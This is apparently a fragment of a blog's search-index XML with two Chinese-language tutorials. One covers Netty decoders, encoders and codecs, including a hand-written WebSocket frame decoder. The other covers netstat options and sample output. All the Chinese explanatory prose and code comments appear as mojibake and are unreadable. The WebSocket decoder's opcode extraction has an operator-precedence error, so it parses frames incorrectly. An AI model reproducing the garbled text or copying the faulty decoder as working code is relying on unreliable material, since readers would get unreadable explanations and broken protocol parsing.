<span class="keyword">void</span> <span class="title function_">callDecode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> (in.isReadable()) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">outSize</span> <span class="operator">=</span> out.size();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (outSize &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                fireChannelRead(ctx, out, outSize);</span><br><span class="line">                out.clear();</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check if this handler was removed before continuing with decoding.</span></span><br><span class="line">                <span class="comment">// If it was removed, it is not safe to continue to operate on the buffer.</span></span><br><span class="line">                <span class="comment">//</span></span><br><span class="line">                <span class="comment">// See:</span></span><br><span class="line">                <span class="comment">// - https://github.com/netty/netty/issues/4635</span></span><br><span class="line">                <span class="keyword">if</span> (ctx.isRemoved()) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                outSize = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">int</span> <span class="variable">oldInputLength</span> <span class="operator">=</span> in.readableBytes();</span><br><span class="line">            decodeRemovalReentryProtection(ctx, in, out);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if this handler was removed before continuing the loop.</span></span><br><span class="line">            <span class="comment">// If it was removed, it is not safe to continue to operate on the buffer.</span></span><br><span class="line">            <span class="comment">//</span></span><br><span class="line">            <span class="comment">// See https://github.com/netty/netty/issues/1664</span></span><br><span class="line">            <span class="keyword">if</span> (ctx.isRemoved()) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (outSize == out.size()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (oldInputLength == in.readableBytes()) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (oldInputLength == in.readableBytes()) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DecoderException</span>(</span><br><span class="line">                        StringUtil.simpleClassName(getClass()) +</span><br><span class="line">                                <span class="string">&quot;.decode() did not read anything but decoded a message.&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (isSingleDecode()) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (DecoderException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception cause) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DecoderException</span>(cause);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="TooLongFrameException"><a href="#TooLongFrameException" class="headerlink" title="TooLongFrameException"></a>TooLongFrameException</h4><p>æˆ‘ä»¬éœ€è¦åœ¨å­—èŠ‚å¯ä»¥è§£ç ä¹‹å‰åœ¨å†…å­˜ä¸­ç¼“å†²å®ƒä»¬ã€‚å› æ­¤ï¼Œä¸èƒ½è®©è§£ç å™¨ç¼“å†²å¤§é‡çš„æ•°æ®ä»¥è‡³äºè€—å°½å¯ç”¨çš„å†…å­˜ã€‚ä¸ºäº†è§£é™¤è¿™ä¸ªå¸¸è§çš„é¡¾è™‘ï¼ŒNettyæä¾›äº†<code>TooLongFrameException</code>ç±»ï¼Œå¦‚æœç¼“å†²åŒºè¶…å‡ºæŒ‡å®šå¤§å°é™åˆ¶æ—¶ï¼ˆæ‰‹åŠ¨ï¼‰æŠ›å‡ºã€‚å¦‚æœä½ æ­£åœ¨ä½¿ç”¨ä¸€ä¸ªå¯å˜å¸§å¤§å°çš„åè®®ï¼Œé‚£ä¹ˆè¿™ç§ä¿æŠ¤æªæ–½å°†æ˜¯å°¤ä¸ºé‡è¦çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeByteToMessageDecoder</span> <span class="keyword">extends</span> <span class="title class_">ByteToMessageDecoder</span> &#123;</span><br><span class="line">ã€€ã€€<span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="variable">MAX_FRAME_SIZE</span> <span class="operator">=</span> <span class="number">1024</span>;</span><br><span class="line">ã€€ã€€<span class="meta">@Override</span></span><br><span class="line">ã€€ã€€<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">readable</span> <span class="operator">=</span> in.readableBytes();</span><br><span class="line">        <span class="keyword">if</span> (readable &gt; MAX_FRAME_SIZE) &#123;ã€€<span class="comment">// æ£€æŸ¥ç¼“å†²åŒºä¸­æ˜¯å¦æœ‰è¶…è¿‡MAX_FRAME_SIZEä¸ªå­—èŠ‚</span></span><br><span class="line">        ã€€ã€€in.skipBytes(readable);ã€€ <span class="comment">// è·³è¿‡æ‰€æœ‰çš„å¯è¯»å­—èŠ‚ï¼ŒæŠ›å‡ºTooLongFrame-Exception å¹¶é€šçŸ¥ChannelHandler</span></span><br><span class="line">        ã€€ã€€<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TooLongFrameException</span>(<span class="string">&quot;Frame too big!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// do something</span></span><br><span class="line">        ...</span><br><span class="line">ã€€ã€€&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="WebSocketFrameDecoder"><a href="#WebSocketFrameDecoder" class="headerlink" title="WebSocketFrameDecoder"></a>WebSocketFrameDecoder</h4><p>è§£æWebSocketæ¶ˆæ¯åè®®ç¤ºä¾‹</p><figure class="highlight java"><figcaption><span>WebSocketFrameDecoder.java</span><a href="/downloads/code/WebSocketFrameDecoder.java">view raw</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketFrameDecoder</span> <span class="keyword">extends</span> <span class="title class_">ByteToMessageDecoder</span> {</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">short</span> <span class="variable">MAX_FRAME_SIZE</span> <span class="operator">=</span> <span class="number">1024</span> * <span class="number">10</span>; <span class="comment">// 10kb</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">READ_HEADER</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">READ_EXT_PAYLOAD_LEN_16</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">READ_EXT_PAYLOAD_LEN_64</span> <span class="operator">=</span> <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">READ_MASK_KEY</span> <span class="operator">=</span> <span class="number">8</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">byte</span> <span class="variable">READ_PAYLOAD</span> <span class="operator">=</span> <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span> <span class="variable">STATE</span> <span class="operator">=</span> READ_HEADER;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// frame</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span> fin;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span> opcode;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span> mask;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">long</span> payloadLen;</span><br><span class="line">    <span class="comment">// æ— ç¬¦å·byte</span></span><br><span class="line">    <span class="keyword">private</span> <span class="type">short</span>[] maskKey = <span class="keyword">new</span> <span class="title class_">short</span>[<span class="number">4</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="type">byte</span>[] payload;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">reset</span><span class="params">()</span> {</span><br><span class="line">        STATE = READ_HEADER;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception {</span><br><span class="line">        <span class="keyword">if</span> (STATE == READ_HEADER) {</span><br><span class="line">            <span class="keyword">if</span> (in.readableBytes() &lt; <span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">header</span> <span class="operator">=</span> in.readUnsignedShort();</span><br><span class="line">            fin = (<span class="type">byte</span>) (header &gt;&gt; <span class="number">15</span>);</span><br><span class="line">            opcode = (<span class="type">byte</span>) (header &amp; <span class="number">0b0000111100000000</span> &gt;&gt; <span class="number">8</span>);</span><br><span class="line">            mask = (<span class="type">byte</span>) ((header &amp; <span class="number">0b0000000010000000</span>) &gt;&gt; <span class="number">7</span>);</span><br><span class="line">            payloadLen = header &amp; <span class="number">0b0000000001111111</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (payloadLen == <span class="number">127</span>) STATE = READ_EXT_PAYLOAD_LEN_64;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (payloadLen == <span class="number">126</span>) STATE = READ_EXT_PAYLOAD_LEN_16;</span><br><span class="line">            <span class="keyword">else</span> STATE = READ_MASK_KEY;</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span> (STATE == READ_EXT_PAYLOAD_LEN_16) {</span><br><span class="line">            <span class="keyword">if</span> (in.readableBytes() &lt; <span class="number">2</span>) <span class="keyword">return</span>;</span><br><span class="line">            payloadLen = in.readUnsignedShort();</span><br><span class="line"></span><br><span class="line">            STATE = READ_MASK_KEY;</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span> (STATE == READ_EXT_PAYLOAD_LEN_64) {</span><br><span class="line">            <span class="keyword">if</span> (in.readableBytes() &lt; <span class="number">8</span>) <span class="keyword">return</span>;</span><br><span class="line">            <span class="comment">// åè®®è§„å®š64ä½æ—¶æœ€é«˜æœ‰æ•ˆä½å¿…é¡»æ˜¯0</span></span><br><span class="line">            payloadLen = in.readLong();</span><br><span class="line"></span><br><span class="line">            STATE = READ_MASK_KEY;</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span> (STATE == READ_MASK_KEY) {</span><br><span class="line">            <span class="keyword">if</span> (mask == <span class="number">1</span>) {</span><br><span class="line">                <span class="keyword">if</span> (in.readableBytes() &lt; <span class="number">4</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">                maskKey[<span class="number">0</span>] = in.readUnsignedByte();</span><br><span class="line">                maskKey[<span class="number">1</span>] = in.readUnsignedByte();</span><br><span class="line">                maskKey[<span class="number">2</span>] = in.readUnsignedByte();</span><br><span class="line">                maskKey[<span class="number">3</span>] = in.readUnsignedByte();</span><br><span class="line">            }</span><br><span class="line">            STATE = READ_PAYLOAD;</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span> (STATE == READ_PAYLOAD) {</span><br><span class="line">            <span class="keyword">if</span> (payloadLen &gt; MAX_FRAME_SIZE) {</span><br><span class="line">                <span class="comment">//bad frame. you should close the channel.</span></span><br><span class="line">                in.skipBytes(in.readableBytes());</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TooLongFrameException</span>(<span class="string">&quot;Frame too big!&quot;</span>);</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in.readableBytes() &lt; payloadLen) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">            payload = <span class="keyword">new</span> <span class="title class_">byte</span>[(<span class="type">int</span>) payloadLen];</span><br><span class="line">            <span class="type">int</span> <span class="variable">pos</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (in.isReadable() &amp;&amp; payloadLen &gt; <span class="number">0</span>) {</span><br><span class="line">                payload[pos] = (<span class="type">byte</span>) (in.readByte() ^ maskKey[pos % <span class="number">4</span>]);</span><br><span class="line">                pos++;</span><br><span class="line">                payloadLen--;</span><br><span class="line">            }</span><br><span class="line"></span><br><span class="line">            out.add(<span class="keyword">new</span> <span class="title class_">WebSocketFrame</span>(fin, opcode, mask, payload.length, maskKey, payload));</span><br><span class="line">            reset(); <span class="comment">// next frame</span></span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure><h3 id="ç¼–ç å™¨"><a href="#ç¼–ç å™¨" class="headerlink" title="ç¼–ç å™¨"></a>ç¼–ç å™¨</h3><ul><li><p>å°†æ¶ˆæ¯ç¼–ç ä¸ºå­—èŠ‚ â€“ MessageToByteEncoder</p>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntegerToByteEncoder</span> <span class="keyword">extends</span> <span class="title class_">MessageToByteEncoder</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">encode</span><span class="params">(ChannelHandlerContext ctx, Integer msg, ByteBuf out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        out.writeInt(msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>å°†æ¶ˆæ¯ç¼–ç ä¸ºæ¶ˆæ¯ â€“ MessageToMessageEncoder</p></li></ul><h3 id="ByteToMessageCodec-å’Œ-MessageToMessageCodec"><a href="#ByteToMessageCodec-å’Œ-MessageToMessageCodec" class="headerlink" title="ByteToMessageCodec å’Œ MessageToMessageCodec"></a>ByteToMessageCodec å’Œ MessageToMessageCodec</h3><p><code>ByteToMessageCodec</code>å°†å­—èŠ‚ç¼–è§£ç ä¸ºæ¶ˆæ¯ï¼Œå®ƒç»“åˆäº†<code>ByteToMessageDecoder</code>ä»¥åŠå®ƒçš„é€†å‘â€”â€”<code>MessageToByteEncoder</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntegerStringCodec</span> <span class="keyword">extends</span> <span class="title class_">ByteToMessageCodec</span>&lt;Integer&gt; &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">encode</span><span class="params">(ChannelHandlerContext ctx, Integer msg, ByteBuf out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       out.writeInt(msg); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(ChannelHandlerContext ctx, ByteBuf in, List&lt;Object&gt; out)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (in.readableBytes() &gt;= <span class="number">4</span>) out.add(in.readInt());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CombinedChannelDuplexHandler"><a href="#CombinedChannelDuplexHandler" class="headerlink" title="CombinedChannelDuplexHandler"></a>CombinedChannelDuplexHandler</h3><p><code>ByteToMessageCodec</code> å’Œ <code>MessageToMessageCodec</code> å°†ç¼–è§£ç é€»è¾‘åœ¨ä¸€ä¸ªç±»ä¸­å®ç°ï¼Œæœ‰æ—¶å€™æˆ‘ä»¬ç¼–è§£ç å¯èƒ½åœ¨ä¸åŒçš„ç±»ä¸­ï¼Œèƒ½ä¸èƒ½æä¾›ä¸€ä¸ªç»„åˆçš„å°†ç¼–è§£ç ç»„åˆåˆ°ä¸€ä¸ªç±»ä¸­å‘¢ï¼Ÿ<code>CombinedChannelDuplexHandler</code>æä¾›äº†è¿™ä¸ªè§£å†³æ–¹æ¡ˆã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">IntegerByteCodec</span> <span class="keyword">extends</span> <span class="title class_">CombinedChannelDuplexHandler</span>&lt;ToIntegerDecoder, IntegerToByteEncoder&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">IntegerByteCodec</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">ToIntegerDecoder</span>(), <span class="keyword">new</span> <span class="title class_">IntegerToByteEncoder</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="https://book.douban.com/subject/27038538/">Nettyå®æˆ˜</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> netty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netstat</title>
      <link href="/post/netstat.html"/>
      <url>/post/netstat.html</url>
      
        <content type="html"><![CDATA[<h2 id="Netstat"><a href="#Netstat" class="headerlink" title="Netstat"></a>Netstat</h2><p>Netstat æ˜¯ä¸€æ¬¾å‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ç”¨äºåˆ—å‡ºç³»ç»Ÿä¸Šæ‰€æœ‰çš„ç½‘ç»œå¥—æ¥å­—è¿æ¥æƒ…å†µï¼ŒåŒ…æ‹¬ tcp, udp ä»¥åŠ unix å¥—æ¥å­—ï¼Œå¦å¤–å®ƒè¿˜èƒ½åˆ—å‡ºå¤„äºç›‘å¬çŠ¶æ€ï¼ˆå³ç­‰å¾…æ¥å…¥è¯·æ±‚ï¼‰çš„å¥—æ¥å­—ã€‚å¦‚æœä½ æƒ³ç¡®è®¤ç³»ç»Ÿä¸Šçš„ Web æœåŠ¡æœ‰æ²¡æœ‰èµ·æ¥ï¼Œä½ å¯ä»¥æŸ¥çœ‹80ç«¯å£æœ‰æ²¡æœ‰æ‰“å¼€ã€‚</p><h3 id="è¯­æ³•åŠé€‰é¡¹"><a href="#è¯­æ³•åŠé€‰é¡¹" class="headerlink" title="è¯­æ³•åŠé€‰é¡¹"></a>è¯­æ³•åŠé€‰é¡¹</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat(é€‰é¡¹)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-aæˆ–--allï¼šæ˜¾ç¤ºæ‰€æœ‰è¿çº¿ä¸­çš„Socketï¼›</span><br><span class="line">-A&lt;ç½‘ç»œç±»å‹&gt;æˆ–--&lt;ç½‘ç»œç±»å‹&gt;ï¼šåˆ—å‡ºè¯¥ç½‘ç»œç±»å‹è¿çº¿ä¸­çš„ç›¸å…³åœ°å€ï¼›</span><br><span class="line">-cæˆ–--continuousï¼šæŒç»­åˆ—å‡ºç½‘ç»œçŠ¶æ€ï¼›</span><br><span class="line">-Cæˆ–--cacheï¼šæ˜¾ç¤ºè·¯ç”±å™¨é…ç½®çš„å¿«å–ä¿¡æ¯ï¼›</span><br><span class="line">-eæˆ–--extendï¼šæ˜¾ç¤ºç½‘ç»œå…¶ä»–ç›¸å…³ä¿¡æ¯ï¼›</span><br><span class="line">-Fæˆ–--fibï¼šæ˜¾ç¤ºFIBï¼›</span><br><span class="line">-gæˆ–--groupsï¼šæ˜¾ç¤ºå¤šé‡å¹¿æ’­åŠŸèƒ½ç¾¤ç»„ç»„å‘˜åå•ï¼›</span><br><span class="line">-hæˆ–--helpï¼šåœ¨çº¿å¸®åŠ©ï¼›</span><br><span class="line">-iæˆ–--interfacesï¼šæ˜¾ç¤ºç½‘ç»œç•Œé¢ä¿¡æ¯è¡¨å•ï¼›</span><br><span class="line">-læˆ–--listeningï¼šæ˜¾ç¤ºç›‘æ§ä¸­çš„æœåŠ¡å™¨çš„Socketï¼›</span><br><span class="line">-Mæˆ–--masqueradeï¼šæ˜¾ç¤ºä¼ªè£…çš„ç½‘ç»œè¿çº¿ï¼›</span><br><span class="line">-næˆ–--numericï¼šç›´æ¥ä½¿ç”¨ipåœ°å€ï¼Œè€Œä¸é€šè¿‡åŸŸåæœåŠ¡å™¨ï¼›</span><br><span class="line">-Næˆ–--netlinkæˆ–--symbolicï¼šæ˜¾ç¤ºç½‘ç»œç¡¬ä»¶å¤–å›´è®¾å¤‡çš„ç¬¦å·è¿æ¥åç§°ï¼›</span><br><span class="line">-oæˆ–--timersï¼šæ˜¾ç¤ºè®¡æ—¶å™¨ï¼›</span><br><span class="line">-pæˆ–--programsï¼šæ˜¾ç¤ºæ­£åœ¨ä½¿ç”¨Socketçš„ç¨‹åºè¯†åˆ«ç å’Œç¨‹åºåç§°ï¼›</span><br><span class="line">-ræˆ–--routeï¼šæ˜¾ç¤ºRouting Tableï¼›</span><br><span class="line">-sæˆ–--statisticeï¼šæ˜¾ç¤ºç½‘ç»œå·¥ä½œä¿¡æ¯ç»Ÿè®¡è¡¨ï¼›</span><br><span class="line">-tæˆ–--tcpï¼šæ˜¾ç¤ºTCPä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µï¼›</span><br><span class="line">-uæˆ–--udpï¼šæ˜¾ç¤ºUDPä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µï¼›</span><br><span class="line">-væˆ–--verboseï¼šæ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹ï¼›</span><br><span class="line">-Væˆ–--versionï¼šæ˜¾ç¤ºç‰ˆæœ¬ä¿¡æ¯ï¼›</span><br><span class="line">-wæˆ–--rawï¼šæ˜¾ç¤ºRAWä¼ è¾“åè®®çš„è¿çº¿çŠ¶å†µï¼›</span><br><span class="line">-xæˆ–--unixï¼šæ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š&quot;-A unix&quot;å‚æ•°ç›¸åŒï¼›</span><br><span class="line">--ipæˆ–--inetï¼šæ­¤å‚æ•°çš„æ•ˆæœå’ŒæŒ‡å®š&quot;-A inet&quot;å‚æ•°ç›¸åŒã€‚</span><br></pre></td></tr></table></figure><h3 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><ol><li><p>åˆ—å‡ºæ‰€æœ‰è¿æ¥</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -a</span> </span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">tcp        0      0 *:mysql                     *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:http                      *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:ssh                       *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:https                     *:*                         LISTEN      </span><br><span class="line">tcp        0    440 172.22.203.148:ssh          1.203.10.198:51439          ESTABLISHED </span><br><span class="line">tcp        0      0 172.22.203.148:http         39.116.52.213:45566         ESTABLISHED </span><br><span class="line">udp        0      0 172.22.203.148:ntp          *:*                                     </span><br><span class="line">Active UNIX domain sockets (servers and established)</span><br><span class="line">Proto RefCnt Flags       Type       State         I-Node Path</span><br><span class="line">unix  2      [ ACC ]     STREAM     LISTENING     125319903 /var/lib/mysql/mysql.sock</span><br><span class="line">unix  2      [ ]         DGRAM                    125678271 </span><br><span class="line">unix  2      [ ]         STREAM     CONNECTED     125330402 </span><br><span class="line">unix  2      [ ]         STREAM     CONNECTED     125330400 </span><br><span class="line">unix  2      [ ]         DGRAM                    125320497 </span><br><span class="line">unix  2      [ ]         STREAM     CONNECTED     125303610 </span><br></pre></td></tr></table></figure><p> ä¸Šé¢å‘½ä»¤ä¼šåˆ—å‡ºæ¥æœåŠ¡å™¨ä¸Šæ‰€æœ‰çš„tcpã€udpåŠunixå¥—æ¥å­—ç­‰è¿æ¥ä¿¡æ¯ã€‚</p></li><li><p>åªåˆ—å‡º TCP æˆ– UDP åè®®çš„è¿æ¥</p><p> ä½¿ç”¨ -t é€‰é¡¹åˆ—å‡º TCP åè®®çš„è¿æ¥ï¼š</p> <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">netstat -at</span></span><br><span class="line">Active Internet connections (servers and established)</span><br><span class="line">Proto Recv-Q Send-Q Local Address               Foreign Address             State      </span><br><span class="line">tcp        0      0 *:mysql                     *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:http                      *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:ssh                       *:*                         LISTEN      </span><br><span class="line">tcp        0      0 *:https                     *:*                         LISTEN      </span><br><span class="line">tcp        0    440 172.22.203.148:ssh          1.203.10.198:51439          